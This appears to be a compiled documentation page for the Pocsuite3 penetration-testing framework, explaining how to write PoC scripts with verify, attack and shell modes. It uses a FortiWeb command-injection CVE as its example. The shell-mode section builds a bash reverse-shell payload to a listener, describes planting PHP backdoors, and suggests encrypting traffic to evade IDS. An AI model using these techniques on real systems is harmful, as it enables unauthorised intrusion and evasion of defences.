import{_ as s,a as n,b as a,c as l}from"./chunks/poc-script-write-tls-traffic.f9c9e739.js";import{_ as p,j as o,g as e,H as t}from"./chunks/framework.8815fd6f.js";const h=JSON.parse('{"title":"Write PoC","description":"","frontmatter":{},"headers":[{"level":2,"title":"Start From Scratch","slug":"start-from-scratch"},{"level":2,"title":"Automatically Generated Template","slug":"automatically-generated-template"},{"level":2,"title":"Minimal PoC Template","slug":"minimal-poc-template"}],"relativePath":"en/guide/poc-script-write.md","lastUpdated":1663185605000}'),c={name:"en/guide/poc-script-write.md"},r=t(`<h1 id="write-poc" tabindex="-1">Write PoC <a class="header-anchor" href="#write-poc" aria-hidden="true">#</a></h1><p>This section introduces how to write a PoC using Pocsuite3.</p><p>Pocsuite3 only supports Python 3.x. To write PoC in Python3 format, developers need basic Python3 knowledge.</p><h2 id="start-from-scratch" tabindex="-1">Start From Scratch <a class="header-anchor" href="#start-from-scratch" aria-hidden="true">#</a></h2><ol><li><p>First create a <code>*.py</code> file, Naming Convention refer to: <a href="./poc-specification.html#poc-naming-convention">&quot;PoC Naming Convention&quot;</a></p></li><li><p>Import the classes and methods from <code>pocsuite3.api</code>, and write the PoC class <code>DemoPOC</code>, which inherits from the <code>PoCBase</code> class.</p></li></ol><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#89DDFF;font-style:italic;">from</span><span style="color:#A6ACCD;"> pocsuite3</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">api </span><span style="color:#89DDFF;font-style:italic;">import</span><span style="color:#A6ACCD;"> Output</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> POCBase</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> register_poc</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> requests</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> logger</span></span>
<span class="line"><span style="color:#89DDFF;font-style:italic;">from</span><span style="color:#A6ACCD;"> pocsuite3</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">api </span><span style="color:#89DDFF;font-style:italic;">import</span><span style="color:#A6ACCD;"> get_listener_ip</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> get_listener_port</span></span>
<span class="line"><span style="color:#89DDFF;font-style:italic;">from</span><span style="color:#A6ACCD;"> pocsuite3</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">api </span><span style="color:#89DDFF;font-style:italic;">import</span><span style="color:#A6ACCD;"> REVERSE_PAYLOAD</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> random_str</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">class</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">DemoPOC</span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">POCBase</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    ...</span></span>
<span class="line"></span></code></pre></div><ol start="3"><li>Fill in the PoC attribute fields, <strong>Please fill in all attribute fields carefully</strong></li></ol><div class="tip custom-block"><p class="custom-block-title">TIP</p><p>None of these fields are must required and can be left blank</p></div><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">    vulID </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">99335</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Seebug SSVID, default is 0</span></span>
<span class="line"><span style="color:#A6ACCD;">    version </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">1</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># The version of the PoC, defaults is 1</span></span>
<span class="line"><span style="color:#A6ACCD;">    author </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">seebug</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># PoC author</span></span>
<span class="line"><span style="color:#A6ACCD;">    vulDate </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">2021-8-18</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Vulnerability disclosure date (%Y-%m-%d)</span></span>
<span class="line"><span style="color:#A6ACCD;">    createDate </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">2021-8-20</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># PoC create date (%Y-%m-%d)</span></span>
<span class="line"><span style="color:#A6ACCD;">    updateDate </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">2021-8-20</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># PoC update date (%Y-%m-%d)</span></span>
<span class="line"><span style="color:#A6ACCD;">    references </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">https://www.seebug.org/vuldb/ssvid-99335</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Advisory URL</span></span>
<span class="line"><span style="color:#A6ACCD;">    name </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Fortinet FortiWeb Post-Auth RCE (CVE-2021-22123)</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># &lt;vendor&gt; &lt;component&gt; &lt;version&gt; &lt;vulnerability type&gt; &lt;cve number&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    appPowerLink </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">https://www.fortinet.com</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Vendor homepage</span></span>
<span class="line"><span style="color:#A6ACCD;">    appName </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">FortiWeb</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Product or component name</span></span>
<span class="line"><span style="color:#A6ACCD;">    appVersion </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">&lt;=6.4.0</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Affected version</span></span>
<span class="line"><span style="color:#A6ACCD;">    vulType </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">Code Execution</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Vulnerability type</span></span>
<span class="line"><span style="color:#A6ACCD;">    desc </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">The parameter name in /api/v2.0/user/remoteserver.saml contains a command injection vulnerability.</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Vulnerability description</span></span>
<span class="line"><span style="color:#A6ACCD;">    samples </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">http://192.168.1.1</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">    install_requires </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">BeautifulSoup4:bs4</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># PoC third-party module dependencies</span></span>
<span class="line"><span style="color:#A6ACCD;">    pocDesc </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;&#39;&#39;</span><span style="color:#C3E88D;"> Usage description of PoC </span><span style="color:#89DDFF;">&#39;&#39;&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    category </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> POC_CATEGORY</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">EXPLOITS</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">WEBAPP</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># PoC category</span></span>
<span class="line"><span style="color:#A6ACCD;">    protocol </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> POC_CATEGORY</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">PROTOCOL</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">HTTP</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># PoC protocol</span></span>
<span class="line"><span style="color:#A6ACCD;">    protocol_default_port </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">8443</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Target default port, used for URL formatting when the provided target does not contain a port</span></span>
<span class="line"><span style="color:#A6ACCD;">    dork </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">zoomeye</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">deviceState.admin.hostname</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">}</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># Cyberspace serach engine dork</span></span>
<span class="line"><span style="color:#A6ACCD;">    suricata_request </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;&#39;&#39;</span><span style="color:#C3E88D;">http.uri; content: &quot;/api/v2.0/user/remoteserver.saml&quot;;</span><span style="color:#89DDFF;">&#39;&#39;&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># suricata rule of request</span></span>
<span class="line"><span style="color:#A6ACCD;">    suricata_response </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#676E95;font-style:italic;"># suricata rule of response</span></span>
<span class="line"></span></code></pre></div><ol start="4"><li>Write code for verify mode</li></ol><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_verify</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">      output </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Output</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#676E95;font-style:italic;"># </span><span style="color:#89DDFF;font-style:italic;">TODO</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> result</span><span style="color:#89DDFF;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">          output</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">success</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#89DDFF;font-style:italic;">else</span><span style="color:#89DDFF;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">          output</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">fail</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">target is not vulnerable</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> output</span></span>
<span class="line"></span></code></pre></div><p><code>output</code> is the standard output API of Pocsuite3. If you want to print success information, use <code>output.success(result)</code>, if you want to print failure information, use <code>output.fail()</code>. The system automatically catches exceptions, no need to handle exceptions in PoC. It is recommended to use the <code>parse_output()</code> function in PoCBase to return results.</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_verify</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> verify</span><span style="color:#89DDFF;">=True):</span></span>
<span class="line"><span style="color:#A6ACCD;">    result </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{}</span></span>
<span class="line"><span style="color:#A6ACCD;">    ...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#676E95;font-style:italic;"># PoCBase</span></span>
<span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> result</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    output </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Output</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> result</span><span style="color:#89DDFF;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">        output</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">success</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">else</span><span style="color:#89DDFF;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">        output</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">fail</span><span style="color:#89DDFF;">()</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> output</span></span>
<span class="line"></span></code></pre></div><div class="tip custom-block"><p class="custom-block-title">TIP</p><p>In <code>self.parse_output(result)</code>, if result is not empty, it will return success information (PoC verification is successful), otherwise it will return failure information.</p></div><ol start="5"><li>Write code for attack mode</li></ol><p>Attack mode support operations like getshell, checking admin&#39;s username and password. It can be defined in the similar way as verify mode.</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_attack</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    output </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Output</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    result </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#676E95;font-style:italic;"># </span><span style="color:#89DDFF;font-style:italic;">TODO</span></span>
<span class="line"></span></code></pre></div><p>Like verify mode, after successful attack, it is needed to save the result to <code>result</code> parameter and call <code>self.parse_output(result)</code> to return.</p><div class="tip custom-block"><p class="custom-block-title">TIP</p><p>If the PoC doesn&#39;t support attack mode, you can add <code>return self._verify()</code> under <code>_attack()</code> function. Then there is no need for you to rewrite <code>_attack()</code> function.</p></div><ol start="6"><li>Write code for shell mode</li></ol><p>Pocsuite3 will listen to <code>6666</code> in shell mode by default. Then write corresponding attack code, let the victim connect to the <code>6666</code> port of the system with Pocsuite3 running, then you can get shell of the victim&#39;s computer.</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_shell</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    cmd </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> REVERSE_PAYLOAD</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">BASH</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">format</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">get_listener_ip</span><span style="color:#89DDFF;">(),</span><span style="color:#82AAFF;"> get_listener_port</span><span style="color:#89DDFF;">())</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#676E95;font-style:italic;"># execute cmd</span></span>
<span class="line"></span></code></pre></div><p>In shell mode, you can only run one PoC script at the same time as the console will enter the shell interaction mode, execute command and print.</p><p>From Version <em><strong>1.8.5</strong></em>, Pocsuite3 supports bind shell. The operation method is the same as before. You need to designate ip and port. IP can be a private IP in the local network or a public IP address of your server.</p><p>The implementation of bind shell is located at <a href="https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/listener/bind_tcp.py" target="_blank" rel="noreferrer"><code>./pocsuite3/modules/listener/bind_tcp.py</code></a>. It implements a third layer, which connects the bind shell (eg., telnet, nc, php single line shell) and the IP/port user designated to use. Using that, the shell mode can run in the private network, and doesn&#39;t subject to the network restriction.</p><p>Pocsuite3 supports three types of bind shell as following.</p><p><code>bind_shell</code>: Genearal method, directly use it by <code>return bind_shell(self, rce_func)</code> in shell mode. For the vulnerabilities which you can get the execution result, you can define a rce function(you can use anything you like as the function name) . The function&#39;s parameter is the command input, and the output is the execution result. If no result you can get, it is possible to write a one-line backdoor to convert it to the previous one. Which is worth noticing is that users can also implement traffic encryption method to avoid IDS detection.</p><p><code>bind_tcp_shell</code>: Support tcp bind shell. Using <code>return bind_tcp_shell(bind_shell_ip, bind_shell_port)</code> in shell mode.</p><p><code>bind_telnet_shell</code>: Support telnet service. Using <code>return bind_telnet_shell(ip, port, username, password)</code> in shell mode.</p><p>For example, telnet weak credential implementation in shell mode. It works with one line code.</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_shell</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">bind_telnet_shell</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">ip</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> port</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">iot</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">***</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span></code></pre></div><p><img src="`+s+'" alt=""></p><p>In the php environment, write a php backdoor in the target, and then implement the AES encryption and decryption of the traffic in the <code>_rce</code> method:</p><p><img src="'+n+`" alt=""></p><p>It is worth mentioning that for the vulnerability that can obtain the execution result, we only need to define a <code>_exploit</code> method in the PoC, and then you can easily implement the three modes of <code>_verify</code>, <code>_attack</code>, <code>_shell</code>, as follows :</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#676E95;font-style:italic;"># </span><span style="color:#89DDFF;font-style:italic;">TODO</span></span>
<span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_exploit</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> cmd</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">id</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    result </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&#39;&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    res </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> requests</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">get</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">url</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    logger</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">debug</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">res</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">text</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    result </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> res</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">text</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> result</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_verify</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    result </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">not</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">_check</span><span style="color:#89DDFF;">():</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">    flag </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">random_str</span><span style="color:#89DDFF;">(</span><span style="color:#F78C6C;">10</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    cmd </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">f</span><span style="color:#C3E88D;">&#39;echo </span><span style="color:#A6ACCD;">{flag}</span><span style="color:#C3E88D;">&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    res </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">_exploit</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">cmd</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> flag </span><span style="color:#89DDFF;">in</span><span style="color:#A6ACCD;"> res</span><span style="color:#89DDFF;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">        result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{}</span></span>
<span class="line"><span style="color:#A6ACCD;">        result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">URL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">url</span></span>
<span class="line"><span style="color:#A6ACCD;">        result</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">VerifyInfo</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">][</span><span style="color:#A6ACCD;">cmd</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> res</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_options</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    o </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">OrderedDict</span><span style="color:#89DDFF;">()</span></span>
<span class="line"><span style="color:#A6ACCD;">    o</span><span style="color:#89DDFF;">[</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">cmd</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">OptString</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">id</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> </span><span style="color:#A6ACCD;">description</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">The command to execute</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> o</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_attack</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    result </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">not</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">_check</span><span style="color:#89DDFF;">():</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
